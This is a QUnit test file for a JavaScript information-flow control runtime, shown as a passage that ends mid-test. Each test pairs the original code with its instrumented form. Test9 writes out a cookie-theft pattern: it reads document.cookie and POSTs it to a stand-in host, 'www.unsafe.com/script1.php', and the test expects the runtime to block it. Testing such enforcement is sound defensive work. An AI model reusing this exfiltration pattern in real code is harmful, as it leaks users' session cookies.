$(function() {

   module('Testing Runtime Libraries');

   /*
    * Original Code:
    *   var x, y;
    *   x = 4;
    *   upgVar(x, '2');
    *   y = x + 4;
    */
   function test1() {
      var _lab, _pc, _aux_1, _aux_2, _aux_3, _val_0, _lev_0;
      var x, y;
      _pc = _runtime.lat.bot;
      _lab = _runtime.initLab(['x', 'y'], _pc);
      _runtime.enforce(_pc, _runtime.getVarLev('x', _lab));
      _runtime.setVarLev('x', _runtime.lat.lub(_runtime.lat.bot, _pc), _lab);
      x = 4;
      _runtime.enforce(_pc, _runtime.getVarLev('x', _lab));
      _runtime.setVarLev('x', _runtime.lat.lub(_runtime.getVarLev('x', _lab), '2'), _lab);
      _runtime.isValidOpInvocation('+', x, 4);
      _val_0 = x + 4;
      _lev_0 = _runtime.lat.lub(_runtime.lat.lub(_runtime.getVarLev('x', _lab), _runtime.lat.bot), _pc);
      _runtime.enforce(_pc, _runtime.getVarLev('y', _lab));
      _runtime.setVarLev('y', _lev_0, _lab);
      y = _val_0;
   }

   test('Assignment + Variable Upgrade', function() {
      var res;
      try {
         res = test1();
         ok(true);
      } catch(e) {
         ok(false);
         console.log('Test1: ' + e.message);
      }
   });


   /*
    * Original Code:
    *   var x, y;
    *   y = 3;
    *   upgVar(y, '2');
    *   if (y) {
    *      x = 2;
    *   }
    */
   function test2() {
      var _lab, _pc, _aux_1, _aux_2, _aux_3, _pc_holder_1;
      var x, y;
      _pc = _runtime.lat.bot;
      _lab = _runtime.initLab(['x', 'y'], _pc);
      _runtime.enforce(_pc, _runtime.getVarLev('y', _lab));
      _runtime.setVarLev('y', _runtime.lat.lub(_runtime.lat.bot, _pc), _lab);
      y = 3;
      _runtime.enforce(_pc, _runtime.getVarLev('y', _lab));
      _runtime.setVarLev('y', _runtime.lat.lub(_runtime.getVarLev('y', _lab), '2'), _lab);
      _pc_holder_1 = _pc;
      _pc = _runtime.lat.lub(_pc, _runtime.getVarLev('y', _lab));
      if (y) {
         _runtime.enforce(_pc, _runtime.getVarLev('x', _lab));
         _runtime.setVarLev('x', _runtime.lat.lub(_runtime.lat.bot, _pc), _lab);
         x = 2;
      }
      _pc = _pc_holder_1;
   }

   test('Assignment + if', function() {
      var res;
      try {
         res = test2();
         ok(false);
      } catch (e) {
         console.log('Test2: ' + e.message);
         ok(true);
      }
   });


   /*
    * Original Code:
    * var x, y, z;
    * y = 3;
    * upgVar(y, '2');
    * z = {};
    * z['p'] = null;
    * upgProp(z, 'p', '2');
    * if (y) {
    *   z['p'] = 2;
    * }
    */

   function test3() {
      var _lab, _pc, _aux_1, _aux_2, _aux_3, _val_0, _lev_0, _pc_holder_1;
      var x, y, z;
      _pc = _runtime.lat.bot;
      _lab = _runtime.initLab(['x', 'y', 'z'], _pc);
      _runtime.enforce(_pc, _runtime.getVarLev('y', _lab));
      _runtime.setVarLev('y', _runtime.lat.lub(_runtime.lat.bot, _pc), _lab);
      y = 3;
      _runtime.enforce(_pc, _runtime.getVarLev('y', _lab));
      _runtime.setVarLev('y', _runtime.lat.lub(_runtime.getVarLev('y', _lab), '2'), _lab);
      _val_0 = _runtime.initObject(null, _pc);
      _lev_0 = _pc;
      _runtime.enforce(_pc, _runtime.getVarLev('z', _lab));
      _runtime.setVarLev('z', _lev_0, _lab);
      z = _val_0;
      _runtime.isValidPropertyAccess(z, 'p');
      if (_runtime.internalHasOwnProperty(z, 'p')) {
         _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('z', _lab), _runtime.lat.bot, _pc), _runtime.getPropLev(z, 'p'));
      } else {
         _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('z', _lab), _runtime.lat.bot, _pc), _runtime.getStructLev(z));
      }
      _runtime.setPropLev(z, 'p', _runtime.lat.lub(_runtime.getVarLev('z', _lab), _runtime.lat.bot, _runtime.lat.bot, _pc));
      z['p'] = null;
      _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('z', _lab), _pc), _runtime.getPropLev(z, 'p'));
      _runtime.setPropLev(z, 'p', _runtime.lat.lub(_runtime.getVarLev('z', _lab), '2', _runtime.getPropLev(z, 'p')));
      _pc_holder_1 = _pc;
      _pc = _runtime.lat.lub(_pc, _runtime.getVarLev('y', _lab));
      if (y) {
         _runtime.isValidPropertyAccess(z, 'p');
         if (_runtime.internalHasOwnProperty(z, 'p')) {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('z', _lab), _runtime.lat.bot, _pc), _runtime.getPropLev(z, 'p'));
         } else {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('z', _lab), _runtime.lat.bot, _pc), _runtime.getStructLev(z));
         }
         _runtime.setPropLev(z, 'p', _runtime.lat.lub(_runtime.getVarLev('z', _lab), _runtime.lat.bot, _runtime.lat.bot, _pc));
         z['p'] = 2;
      }
      _pc = _pc_holder_1;
   }


   test('Property Assignment + if - 1', function() {
      var res;
      try {
         res = test3();
         ok(true);
      } catch (e) {
         ok(false);
         console.log('Test3: ' + e.message)
      }
   });


   /*
    * Original Code:
    * var x, y, z;
    * y = 3;
    * upgVar(y, '2');
    * z = {};
    * z['p'] = null;
    * if (y) {
    *   z['p'] = 2;
    * }
    */
   function test4() {
      var _lab, _pc, _aux_1, _aux_2, _aux_3, _val_0, _lev_0, _pc_holder_1;
      var x, y, z;
      _pc = _runtime.lat.bot;
      _lab = _runtime.initLab(['x', 'y', 'z'], _pc);
      _runtime.enforce(_pc, _runtime.getVarLev('y', _lab));
      _runtime.setVarLev('y', _runtime.lat.lub(_runtime.lat.bot, _pc), _lab);
      y = 3;
      _runtime.enforce(_pc, _runtime.getVarLev('y', _lab));
      _runtime.setVarLev('y', _runtime.lat.lub(_runtime.getVarLev('y', _lab), '2'), _lab);
      _val_0 = _runtime.initObject(null, _pc);
      _lev_0 = _pc;
      _runtime.enforce(_pc, _runtime.getVarLev('z', _lab));
      _runtime.setVarLev('z', _lev_0, _lab);
      z = _val_0;
      _runtime.isValidPropertyAccess(z, 'p');
      if (_runtime.internalHasOwnProperty(z, 'p')) {
         _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('z', _lab), _runtime.lat.bot, _pc), _runtime.getPropLev(z, 'p'));
      } else {
         _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('z', _lab), _runtime.lat.bot, _pc), _runtime.getStructLev(z));
      }
      _runtime.setPropLev(z, 'p', _runtime.lat.lub(_runtime.getVarLev('z', _lab), _runtime.lat.bot, _runtime.lat.bot, _pc));
      z['p'] = null;
      _pc_holder_1 = _pc;
      _pc = _runtime.lat.lub(_pc, _runtime.getVarLev('y', _lab));
      if (y) {
         _runtime.isValidPropertyAccess(z, 'p');
         if (_runtime.internalHasOwnProperty(z, 'p')) {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('z', _lab), _runtime.lat.bot, _pc), _runtime.getPropLev(z, 'p'));
         } else {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('z', _lab), _runtime.lat.bot, _pc), _runtime.getStructLev(z));
         }
         _runtime.setPropLev(z, 'p', _runtime.lat.lub(_runtime.getVarLev('z', _lab), _runtime.lat.bot, _runtime.lat.bot, _pc));
         z['p'] = 2;
      }
      _pc = _pc_holder_1;
   }

   test('Property Assignment + if - 2', function() {
      var res;
      try {
         res = test4();
         ok(false);
      } catch (e) {
         console.log('Test4: ' + e.message);
         ok(true);
      }
   });


   /*
    * Original Code:
    *  var x;
    *  eval('x = 3; x')
    *
    */
   function test5() {
      var _lab, _pc, _aux_1, _aux_2, _aux_3, _val_0, _lev_0;
      var x;
      _pc = _runtime.lat.bot;
      _lab = _runtime.initLab(['x'], _pc);
      if (eval._instrumented) {
         _aux_1 = eval('x = 3; x', [_runtime.lat.bot], _runtime.lat.lub(_runtime.getVarLev('eval', _lab), _pc));
         _val_0 = _aux_1._val;
         _lev_0 = _aux_1._lev;
      } else {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('eval', _lab), _pc);
         _enforceInstr = _runtime.getEnforceFun(eval);
         _computeReturnLevel = _runtime.getComputeRetLevelFun(eval);
         _computeReturnValue = _runtime.getComputeRetValFun(eval);
         _updateArgsLevels = _runtime.getUpdtArgsLevelsFun(eval);
         _processArg = _runtime.getProcessArg(eval);
         _enforceInstr('x = 3; x', [_runtime.lat.bot], _aux_1);
         evaluator = function($) {
            return eval($);
         };
         _aux_2 = eval(_processArg('x = 3; x', 1, evaluator));
         _val_0 = _computeReturnValue('x = 3; x', [_runtime.lat.bot], _aux_1, _aux_2);
         _lev_0 = _computeReturnLevel('x = 3; x', [_runtime.lat.bot], _aux_1, _aux_2);
         _updateArgsLevels('x = 3; x', [_runtime.lat.bot], _aux_1, _aux_2);
      }
   }

   test('Eval() - 1', function() {
      var res;
      try {
         res = test5();
         ok(true);
      } catch (e) {
         console.log('Test5: ' + e.message);
         ok(false);
      }
   });




   /*
    * var x, y;
    * x = 0;
    * y = 2;
    * upgVar(y, '2');
    * if (y) {
    * 	eval('x = 3; x');
    * }
    */
   function test6() {
      var _lab, _pc, _aux_1, _aux_2, _aux_3, _val_0, _lev_0, _pc_holder_1;
      var x, y;
      _pc = _runtime.lat.bot;
      _lab = _runtime.initLab(['x', 'y'], _pc);
      _runtime.enforce(_pc, _runtime.getVarLev('x', _lab));
      _runtime.setVarLev('x', _runtime.lat.lub(_runtime.lat.bot, _pc), _lab);
      x = 0;
      _runtime.enforce(_pc, _runtime.getVarLev('y', _lab));
      _runtime.setVarLev('y', _runtime.lat.lub(_runtime.lat.bot, _pc), _lab);
      y = 2;
      _runtime.enforce(_pc, _runtime.getVarLev('y', _lab));
      _runtime.setVarLev('y', _runtime.lat.lub(_runtime.getVarLev('y', _lab), '2'), _lab);
      _pc_holder_1 = _pc;
      _pc = _runtime.lat.lub(_pc, _runtime.getVarLev('y', _lab));
      if (y) {
         if (eval._instrumented) {
            _aux_1 = eval('x = 3; x', [_runtime.lat.bot], _runtime.lat.lub(_runtime.getVarLev('eval', _lab), _pc));
            _val_0 = _aux_1._val;
            _lev_0 = _aux_1._lev;
         } else {
            _aux_1 = _runtime.lat.lub(_runtime.getVarLev('eval', _lab), _pc);
            _enforceInstr = _runtime.getEnforceFun(eval);
            _computeReturnLevel = _runtime.getComputeRetLevelFun(eval);
            _computeReturnValue = _runtime.getComputeRetValFun(eval);
            _updateArgsLevels = _runtime.getUpdtArgsLevelsFun(eval);
            _processArg = _runtime.getProcessArg(eval);
            _enforceInstr('x = 3; x', [_runtime.lat.bot], _aux_1);
            evaluator = function($) {
               return eval($);
            };
            _aux_2 = eval(_processArg('x = 3; x', 1, evaluator));
            _val_0 = _computeReturnValue('x = 3; x', [_runtime.lat.bot], _aux_1, _aux_2);
            _lev_0 = _computeReturnLevel('x = 3; x', [_runtime.lat.bot], _aux_1, _aux_2);
            _updateArgsLevels('x = 3; x', [_runtime.lat.bot], _aux_1, _aux_2);
         }
      }
      _pc = _pc_holder_1;
   }

   test('Eval() - 2', function() {
      var res;
      try {
         res = test6();
         ok(false);
      } catch (e) {
         console.log('Test6: ' + e.message)
         ok(true);
      }
   });


   /*
    * Original Code:
    * var text_node, h, l;
    * h = 1;
    * upgVar(h, '2');
    * if(h) {
    *    text_node = document['createTextNode']('macaco');
    * }
    * l = text_node;
    */
   function test7() {
      var _lab, _pc, _aux_1, _aux_2, _aux_3, _val_0, _lev_0, _pc_holder_1;
      var text_node, h, l;
      _pc = _runtime.lat.bot;
      _lab = _runtime.initLab(['text_node', 'h', 'l'], _pc);
      _runtime.enforce(_pc, _runtime.getVarLev('h', _lab));
      _runtime.setVarLev('h', _runtime.lat.lub(_runtime.lat.bot, _pc), _lab);
      h = 1;
      _runtime.enforce(_pc, _runtime.getVarLev('h', _lab));
      _runtime.setVarLev('h', _runtime.lat.lub(_runtime.getVarLev('h', _lab), '2'), _lab);
      _pc_holder_1 = _pc;
      _pc = _runtime.lat.lub(_pc, _runtime.getVarLev('h', _lab));
      if (h) {
         _runtime.isValidPropertyAccess(document, 'createTextNode');
         if ('createTextNode'._instrumented) {
            _aux_1 = _runtime.lat.lub(_runtime.getVarLev('document', _lab), _runtime.lat.bot, _runtime.getPropLev(document, 'createTextNode'), _pc);
            _aux_1 = document['createTextNode']('macaco', [_runtime.lat.bot], _aux_1);
            _val_0 = _aux_1._val;
            _lev_0 = _aux_1._lev;
         } else {
            _aux_1 = _runtime.lat.lub(_runtime.getVarLev('document', _lab), _runtime.lat.bot, _runtime.getPropLev(document, 'createTextNode'), _pc);
            _enforceInstr = _runtime.getEnforceMethod(document, 'createTextNode');
            _computeReturnLevel = _runtime.getComputeRetLevelMethod(document, 'createTextNode');
            _updateArgsLevels = _runtime.getUpdtArgsLevelsMethod(document, 'createTextNode');
            _processRetValue = _runtime.getProcessRetValue(document, 'createTextNode');
            _enforceInstr(document, 'macaco', [_runtime.getVarLev('document', _lab), _runtime.lat.bot], _aux_1);
            _val_0 = document['createTextNode']('macaco');
            _val_0 = _processRetValue(document, 'macaco', [_runtime.getVarLev('document', _lab), _runtime.lat.bot], _aux_1, _val_0);
            _lev_0 = _computeRetLevel(document, 'macaco', [_runtime.getVarLev('document', _lab), _runtime.lat.bot], _aux_1);
            _updtArgsLevels(document, 'macaco', [_runtime.getVarLev('document', _lab), _runtime.lat.bot], _aux_1);
         }
         _runtime.enforce(_pc, _runtime.getVarLev('text_node', _lab));
         _runtime.setVarLev('text_node', _lev_0, _lab);
         text_node = _val_0;
      }
      _pc = _pc_holder_1;
      _runtime.enforce(_pc, _runtime.getVarLev('l', _lab));
      _runtime.setVarLev('l', _runtime.lat.lub(_runtime.getVarLev('text_node', _lab), _pc), _lab);
      l = text_node;
   }


   test('createTextNode() - 2', function() {
      var res;
      try {
         res = test7();
         ok(false);
      } catch (e) {
         console.log('Test7: ' + e.message);
         ok(true);
      }
   });

   /*
    * var low_integrity_string, text_node, div;
    * upgVar(low_integrity_string, '2');
    * low_integrity_string = 'xpto';
    * text_node = document['createTextNode'](low_integrity_string);
    * div = document['createElement']('div');
    * div['appendChild'](text_node);
    */
   function test8() {
      var _lab, _pc, _aux_1, _aux_2, _aux_3, _val_2, _lev_2, _val_1, _lev_1, _val_0, _lev_0;
      var low_integrity_string, text_node, div;
      _pc = _runtime.lat.bot;
      _lab = _runtime.initLab(['low_integrity_string', 'text_node', 'div'], _pc);
      _runtime.enforce(_pc, _runtime.getVarLev('low_integrity_string', _lab));
      _runtime.setVarLev('low_integrity_string', _runtime.lat.lub(_runtime.getVarLev('low_integrity_string', _lab), '4'), _lab);
      _runtime.enforce(_pc, _runtime.getVarLev('low_integrity_string', _lab));
      _runtime.setVarLev('low_integrity_string', _runtime.lat.lub(_runtime.lat.bot, _pc), _lab);
      low_integrity_string = 'xpto';
      _runtime.isValidPropertyAccess(document, 'createTextNode');
      if ('createTextNode'._instrumented) {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('document', _lab), _runtime.lat.bot, _runtime.getPropLev(document, 'createTextNode'), _pc);
         _aux_1 = document['createTextNode'](low_integrity_string, [_runtime.getVarLev('low_integrity_string', _lab)], _aux_1);
         _val_2 = _aux_1._val;
         _lev_2 = _aux_1._lev;
      } else {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('document', _lab), _runtime.lat.bot, _runtime.getPropLev(document, 'createTextNode'), _pc);
         _enforceInstr = _runtime.getEnforceMethod(document, 'createTextNode');
         _computeReturnLevel = _runtime.getComputeRetLevelMethod(document, 'createTextNode');
         _updateArgsLevels = _runtime.getUpdtArgsLevelsMethod(document, 'createTextNode');
         _processRetValue = _runtime.getProcessRetValue(document, 'createTextNode');
         _enforceInstr(document, low_integrity_string, [_runtime.getVarLev('document', _lab), _runtime.getVarLev('low_integrity_string', _lab)], _aux_1);
         _val_2 = document['createTextNode'](low_integrity_string);
         _val_2 = _processRetValue(document, low_integrity_string, [_runtime.getVarLev('document', _lab), _runtime.getVarLev('low_integrity_string', _lab)], _aux_1, _val_2);
         _lev_2 = _computeRetLevel(document, low_integrity_string, [_runtime.getVarLev('document', _lab), _runtime.getVarLev('low_integrity_string', _lab)], _aux_1);
         _updtArgsLevels(document, low_integrity_string, [_runtime.getVarLev('document', _lab), _runtime.getVarLev('low_integrity_string', _lab)], _aux_1);
      }
      _runtime.enforce(_pc, _runtime.getVarLev('text_node', _lab));
      _runtime.setVarLev('text_node', _lev_2, _lab);
      text_node = _val_2;
      _runtime.isValidPropertyAccess(document, 'createElement');
      if ('createElement'._instrumented) {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('document', _lab), _runtime.lat.bot, _runtime.getPropLev(document, 'createElement'), _pc);
         _aux_1 = document['createElement']('div', [_runtime.lat.bot], _aux_1);
         _val_1 = _aux_1._val;
         _lev_1 = _aux_1._lev;
      } else {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('document', _lab), _runtime.lat.bot, _runtime.getPropLev(document, 'createElement'), _pc);
         _enforceInstr = _runtime.getEnforceMethod(document, 'createElement');
         _computeReturnLevel = _runtime.getComputeRetLevelMethod(document, 'createElement');
         _updateArgsLevels = _runtime.getUpdtArgsLevelsMethod(document, 'createElement');
         _processRetValue = _runtime.getProcessRetValue(document, 'createElement');
         _enforceInstr(document, 'div', [_runtime.getVarLev('document', _lab), _runtime.lat.bot], _aux_1);
         _val_1 = document['createElement']('div');
         _val_1 = _processRetValue(document, 'div', [_runtime.getVarLev('document', _lab), _runtime.lat.bot], _aux_1, _val_1);
         _lev_1 = _computeRetLevel(document, 'div', [_runtime.getVarLev('document', _lab), _runtime.lat.bot], _aux_1);
         _updtArgsLevels(document, 'div', [_runtime.getVarLev('document', _lab), _runtime.lat.bot], _aux_1);
      }
      _runtime.enforce(_pc, _runtime.getVarLev('div', _lab));
      _runtime.setVarLev('div', _lev_1, _lab);
      div = _val_1;
      _runtime.isValidPropertyAccess(div, 'appendChild');
      if ('appendChild'._instrumented) {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('div', _lab), _runtime.lat.bot, _runtime.getPropLev(div, 'appendChild'), _pc);
         _aux_1 = div['appendChild'](text_node, [_runtime.getVarLev('text_node', _lab)], _aux_1);
         _val_0 = _aux_1._val;
         _lev_0 = _aux_1._lev;
      } else {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('div', _lab), _runtime.lat.bot, _runtime.getPropLev(div, 'appendChild'), _pc);
         _enforceInstr = _runtime.getEnforceMethod(div, 'appendChild');
         _computeReturnLevel = _runtime.getComputeRetLevelMethod(div, 'appendChild');
         _updateArgsLevels = _runtime.getUpdtArgsLevelsMethod(div, 'appendChild');
         _processRetValue = _runtime.getProcessRetValue(div, 'appendChild');
         _enforceInstr(div, text_node, [_runtime.getVarLev('div', _lab), _runtime.getVarLev('text_node', _lab)], _aux_1);
         _val_0 = div['appendChild'](text_node);
         _val_0 = _processRetValue(div, text_node, [_runtime.getVarLev('div', _lab), _runtime.getVarLev('text_node', _lab)], _aux_1, _val_0);
         _lev_0 = _computeRetLevel(div, text_node, [_runtime.getVarLev('div', _lab), _runtime.getVarLev('text_node', _lab)], _aux_1);
         _updtArgsLevels(div, text_node, [_runtime.getVarLev('div', _lab), _runtime.getVarLev('text_node', _lab)], _aux_1);
      }
   }

   test('appendChild() + createElement() + createTextNode() - 1', function() {
      var res;
      try {
         res = test8();
         ok(false);
      } catch (e) {
         console.log('Test8: ' + e.message);
         ok(true);
      }
   });

   /*
    * var xhr, secret;
    * upgVar(secret, '2');
    * upgProp(document, 'cookie', '2');
    * xhr = new XMLHttpRequest();
    * xhr['open']('POST', 'www.unsafe.com/script1.php');
    * secret = document['cookie'];
    * xhr['send'](secret);
    */

   function test9() {
      var _lab, _pc, _aux_1, _aux_2, _aux_3, _val_6, _lev_6, _val_5, _lev_5, _val_4, _lev_4, _val_3, _lev_3;
      var xhr, secret;
      _pc = _runtime.lat.bot;
      _lab = _runtime.initLab(['xhr', 'secret'], _pc);
      _runtime.enforce(_pc, _runtime.getVarLev('secret', _lab));
      _runtime.setVarLev('secret', _runtime.lat.lub(_runtime.getVarLev('secret', _lab), '2'), _lab);
      _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('document', _lab), _pc), _runtime.getPropLev(document, 'cookie'));
      _runtime.setPropLev(document, 'cookie', _runtime.lat.lub(_runtime.getVarLev('document', _lab), '2', _runtime.getPropLev(document, 'cookie')));
      if (XMLHttpRequest._instrumented) {
         _lev_6 = _runtime.lat.lub(_runtime.getVarLev('XMLHttpRequest', _lab), _pc);
         _val_6 = _runtime.initObject(XMLHttpRequest.prototype, _lev_6);
         _aux_1 = _runtime.call(_val_6, XMLHttpRequest, [], _lev_6);
         if (_aux_1) {
            _lev_6 = _aux_1._val;
            _val_6 = _aux_1._lev;
         }
      } else {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('XMLHttpRequest', _lab), _pc);
         _enforceInstr = _runtime.getEnforceConstructor(XMLHttpRequest);
         _computeRetLevel = _runtime.getNewObjLevel(XMLHttpRequest);
         _updtArgsLevels = _runtime.getUpdtArgsLevelsConstructor(XMLHttpRequest);
         _enforceInstr([], _aux_1);
         _val_6 = new XMLHttpRequest();
         _lev_6 = _computeRetLevel([], _aux_1, _val_6);
         _updtArgsLevels([], _aux_1, _val_6);
      }
      _runtime.enforce(_pc, _runtime.getVarLev('xhr', _lab));
      _runtime.setVarLev('xhr', _lev_6, _lab);
      xhr = _val_6;
      _runtime.isValidPropertyAccess(xhr, 'open');
      if ('open'._instrumented) {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('xhr', _lab), _runtime.lat.bot, _runtime.getPropLev(xhr, 'open'), _pc);
         _aux_1 = xhr['open']('POST', 'www.unsafe.com/script1.php', [_runtime.lat.bot, _runtime.lat.bot], _aux_1);
         _val_5 = _aux_1._val;
         _lev_5 = _aux_1._lev;
      } else {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('xhr', _lab), _runtime.lat.bot, _runtime.getPropLev(xhr, 'open'), _pc);
         _enforceInstr = _runtime.getEnforceMethod(xhr, 'open');
         _computeReturnLevel = _runtime.getComputeRetLevelMethod(xhr, 'open');
         _updateArgsLevels = _runtime.getUpdtArgsLevelsMethod(xhr, 'open');
         _processRetValue = _runtime.getProcessRetValue(xhr, 'open');
         _enforceInstr(xhr, 'POST', 'www.unsafe.com/script1.php', [_runtime.getVarLev('xhr', _lab), _runtime.lat.bot, _runtime.lat.bot], _aux_1);
         _val_5 = xhr['open']('POST', 'www.unsafe.com/script1.php');
         _val_5 = _processRetValue(xhr, 'POST', 'www.unsafe.com/script1.php', [_runtime.getVarLev('xhr', _lab), _runtime.lat.bot, _runtime.lat.bot], _aux_1, _val_5);
         _lev_5 = _computeRetLevel(xhr, 'POST', 'www.unsafe.com/script1.php', [_runtime.getVarLev('xhr', _lab), _runtime.lat.bot, _runtime.lat.bot], _aux_1);
         _updtArgsLevels(xhr, 'POST', 'www.unsafe.com/script1.php', [_runtime.getVarLev('xhr', _lab), _runtime.lat.bot, _runtime.lat.bot], _aux_1);
      }
      _runtime.isValidPropertyAccess(document, 'cookie');
      _val_4 = document['cookie'];
      _lev_4 = _runtime.lat.lub(_runtime.getVarLev('document', _lab), _runtime.lat.bot, _runtime.getPropLev(document, 'cookie'));
      _runtime.enforce(_pc, _runtime.getVarLev('secret', _lab));
      _runtime.setVarLev('secret', _lev_4, _lab);
      secret = _val_4;
      _runtime.isValidPropertyAccess(xhr, 'send');
      if ('send'._instrumented) {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('xhr', _lab), _runtime.lat.bot, _runtime.getPropLev(xhr, 'send'), _pc);
         _aux_1 = xhr['send'](secret, [_runtime.getVarLev('secret', _lab)], _aux_1);
         _val_3 = _aux_1._val;
         _lev_3 = _aux_1._lev;
      } else {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('xhr', _lab), _runtime.lat.bot, _runtime.getPropLev(xhr, 'send'), _pc);
         _enforceInstr = _runtime.getEnforceMethod(xhr, 'send');
         _computeReturnLevel = _runtime.getComputeRetLevelMethod(xhr, 'send');
         _updateArgsLevels = _runtime.getUpdtArgsLevelsMethod(xhr, 'send');
         _processRetValue = _runtime.getProcessRetValue(xhr, 'send');
         _enforceInstr(xhr, secret, [_runtime.getVarLev('xhr', _lab), _runtime.getVarLev('secret', _lab)], _aux_1);
         _val_3 = xhr['send'](secret);
         _val_3 = _processRetValue(xhr, secret, [_runtime.getVarLev('xhr', _lab), _runtime.getVarLev('secret', _lab)], _aux_1, _val_3);
         _lev_3 = _computeRetLevel(xhr, secret, [_runtime.getVarLev('xhr', _lab), _runtime.getVarLev('secret', _lab)], _aux_1);
         _updtArgsLevels(xhr, secret, [_runtime.getVarLev('xhr', _lab), _runtime.getVarLev('secret', _lab)], _aux_1);
      }
   }

   test('XMLHttpRequest - 1', function() {
      var res;
      try {
         res = test9();
         ok(false);
      } catch (e) {
         console.log('Test9: ' + e.message);
         ok(true);
      }
   });


   /*
    * var x, y; 
    * x = 0; 
    * y = 1; 
    * upgVar(y, '2'); 
    * if(y) {
    * 	setTimeout('x = 1', 1000); 
    * }
    * 
    */
   function test10() {
      var _lab, _pc, _aux_1, _aux_2, _aux_3, _val_0, _lev_0, _pc_holder_1;
      var x, y;
      _pc = _runtime.lat.bot;
      _lab = _runtime.initLab(['x', 'y'], _pc);
      _runtime.enforce(_pc, _runtime.getVarLev('x', _lab));
      _runtime.setVarLev('x', _runtime.lat.lub(_runtime.lat.bot, _pc), _lab);
      x = 0;
      _runtime.enforce(_pc, _runtime.getVarLev('y', _lab));
      _runtime.setVarLev('y', _runtime.lat.lub(_runtime.lat.bot, _pc), _lab);
      y = 1;
      _runtime.enforce(_pc, _runtime.getVarLev('y', _lab));
      _runtime.setVarLev('y', _runtime.lat.lub(_runtime.getVarLev('y', _lab), '2'), _lab);
      _pc_holder_1 = _pc;
      _pc = _runtime.lat.lub(_pc, _runtime.getVarLev('y', _lab));
      if (y) {
         if (setTimeout._instrumented) {
            _aux_1 = setTimeout('x = 1', 1000, [_runtime.lat.bot, _runtime.lat.bot], _runtime.lat.lub(_runtime.getVarLev('setTimeout', _lab), _pc));
            _val_0 = _aux_1._val;
            _lev_0 = _aux_1._lev;
         } else {
            _aux_1 = _runtime.lat.lub(_runtime.getVarLev('setTimeout', _lab), _pc);
            _enforceInstr = _runtime.getEnforceFun(setTimeout);
            _computeReturnLevel = _runtime.getComputeRetLevelFun(setTimeout);
            _computeReturnValue = _runtime.getComputeRetValFun(setTimeout);
            _updateArgsLevels = _runtime.getUpdtArgsLevelsFun(setTimeout);
            _processArg = _runtime.getProcessArg(setTimeout);
            _enforceInstr('x = 1', 1000, [_runtime.lat.bot, _runtime.lat.bot], _aux_1);
            evaluator = function($) {
               return eval($);
            };
            _aux_2 = setTimeout(_processArg('x = 1', 1, evaluator), _processArg(1000, 2, evaluator));
            _val_0 = _computeReturnValue('x = 1', 1000, [_runtime.lat.bot, _runtime.lat.bot], _aux_1, _aux_2);
            _lev_0 = _computeReturnLevel('x = 1', 1000, [_runtime.lat.bot, _runtime.lat.bot], _aux_1, _aux_2);
            _updateArgsLevels('x = 1', 1000, [_runtime.lat.bot, _runtime.lat.bot], _aux_1, _aux_2);
         }
      }
      _pc = _pc_holder_1;
   }

   test('setTimeout - 1', function() {
      var res;
      try {
         res = test10();
         ok(true);
      } catch (e) {
         console.log('Test10: ' + e.message);
         ok(false);
      }
   });
   

   /*
    * var Person, p; 
    * Person = function(id, name, age) {
    *   var this_aux; 
    *   this_aux = this; 
    *   this_aux['id'] = id;
    *   this_aux['name'] = name; 
    *   this_aux['age'] = age;  
    * }
    * p = new Person(1, 'Raquel', 22); 
    */
   function test11() {
      var _lab, _pc, _aux_1, _aux_2, _aux_3, _val_10, _lev_10, _val_9, _lev_9;
      var Person, p;
      _pc = _runtime.lat.bot;
      _lab = _runtime.initLab(['Person', 'p'], _pc);
      _val_10 = function(id, name, age, args_levels, _pc) {
         var _lab, _aux_1, _aux_2, _aux_3;
         var this_aux;
         _pc = _runtime.lat.lub(_pc, arguments.callee._pc);
         _lab = _runtime.initLab(arguments.callee._lab, ['id', 'name', 'age'], args_levels, ['this_aux'], _pc);
         _runtime.enforce(_pc, _runtime.getVarLev('this_aux', _lab));
         _runtime.setVarLev('this_aux', _runtime.lat.lub(_runtime.getVarLev('this', _lab), _pc), _lab);
         this_aux = this;
         _runtime.isValidPropertyAccess(this_aux, 'id');
         if (_runtime.internalHasOwnProperty(this_aux, 'id')) {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _pc), _runtime.getPropLev(this_aux, 'id'));
         } else {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _pc), _runtime.getStructLev(this_aux));
         }
         _runtime.setPropLev(this_aux, 'id', _runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _runtime.getVarLev('id', _lab), _pc));
         this_aux['id'] = id;
         _runtime.isValidPropertyAccess(this_aux, 'name');
         if (_runtime.internalHasOwnProperty(this_aux, 'name')) {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _pc), _runtime.getPropLev(this_aux, 'name'));
         } else {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _pc), _runtime.getStructLev(this_aux));
         }
         _runtime.setPropLev(this_aux, 'name', _runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _runtime.getVarLev('name', _lab), _pc));
         this_aux['name'] = name;
         _runtime.isValidPropertyAccess(this_aux, 'age');
         if (_runtime.internalHasOwnProperty(this_aux, 'age')) {
